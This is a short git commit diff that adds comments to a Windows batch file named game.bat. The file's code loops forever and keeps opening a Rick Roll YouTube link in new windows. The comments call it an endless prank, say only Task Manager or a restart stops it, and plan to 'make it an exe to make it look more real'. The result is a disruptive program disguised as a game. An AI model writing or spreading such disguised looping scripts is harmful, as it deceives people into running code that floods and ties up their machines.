a1786accc4c2dbcc68b50c83a21d8d0bd80d62f5
thatguynully <pedrodoamaralcarlos@gmail.com>
2026-04-28 16:19:42 -0300

    add comments

--- game.bat
+++ game.bat
@@ -1,4 +1,8 @@
-:: Loops forever because the increment is 0
+:: TODO:make it an exe to make it look more real
+
+:: opens rick roll infnitely
+:: can be stoped with task manager (kill terminal) or with a simple restart
+
 for /l %%x in (1,0,2) do (
    start "" "https://www.youtube.com/watch?v=dQw4w9WgXcQ" ""
 )
